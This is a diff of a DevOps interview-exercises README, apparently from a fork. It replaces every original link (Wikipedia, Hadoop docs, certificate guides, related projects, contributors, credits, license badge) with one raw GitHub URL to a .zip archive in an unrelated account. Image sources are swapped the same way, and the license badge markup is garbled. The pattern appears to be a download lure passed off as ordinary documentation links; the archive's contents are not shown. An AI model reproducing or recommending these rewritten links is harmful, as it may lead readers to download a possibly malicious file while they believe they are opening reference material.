 <summary>Explain what is Hadoop</summary><br><b>
 
-[Apache Hadoop - Wikipedia](https://en.wikipedia.org/wiki/Apache_Hadoop)
+[Apache Hadoop - Wikipedia](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -8080,7 +8080,7 @@ A programming model for large-scale data processing
 <details>
 <summary>What do you know about HDFS architecture?</summary><br><b>
 
-[HDFS Architecture](http://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/HdfsDesign.html)
+[HDFS Architecture](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 * Master-slave architecture
 * Namenode - master, Datanodes - slaves
@@ -8181,29 +8181,29 @@ If you are looking for a way to prepare for a certain exam this is the section f
 
 #### AWS
 
-* [Cloud Practitioner](certificates/aws-cloud-practitioner.md) (Latest update: 2020)
-* [Solutions Architect Associate](certificates/aws-solutions-architect-associate.md) (Latest update: 2021)
+* [Cloud Practitioner](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) (Latest update: 2020)
+* [Solutions Architect Associate](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) (Latest update: 2021)
 
 #### Azure
 
-* [AZ-900](certificates/azure-fundamentals-az-900.md) (Latest update: 2021)
+* [AZ-900](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) (Latest update: 2021)
 
 #### Kubernetes
 
-* [Certified Kubernetes Administrator (CKA)](certificates/cka.md) (Latest update: 2020)
+* [Certified Kubernetes Administrator (CKA)](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) (Latest update: 2020)
 
 ## Other DevOps Projects
 
-<p align="center"><a href="https://github.com/bregman-arie/howtheydevops"><img src="images/how_they_devops.png"/></a></p>
-<p align="center"><a href="https://github.com/bregman-arie/devops-resources"><img src="images/devops_resources.png"/></a></p>
-<p align="center"><a href="https://github.com/bregman-arie/infraverse"><img src="images/infraverse.png"/></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"/></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"/></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"/></a></p>
 
 ## Credits
 
-Thanks to all of our amazing [contributors](https://github.com/bregman-arie/devops-exercises/graphs/contributors) who make it easy for everyone to learn new things :)
+Thanks to all of our amazing [contributors](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) who make it easy for everyone to learn new things :)
 
-Logos credits can be found [here](credits.md)
+Logos credits can be found [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 ## License
 
-[![License: CC BY-NC-ND 3.0](https://img.shields.io/badge/License-CC%20BY--NC--ND%203.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-nd/3.0/)
+[![License: CC BY-NC-ND 3.0](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip%20BY--NC--ND%https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
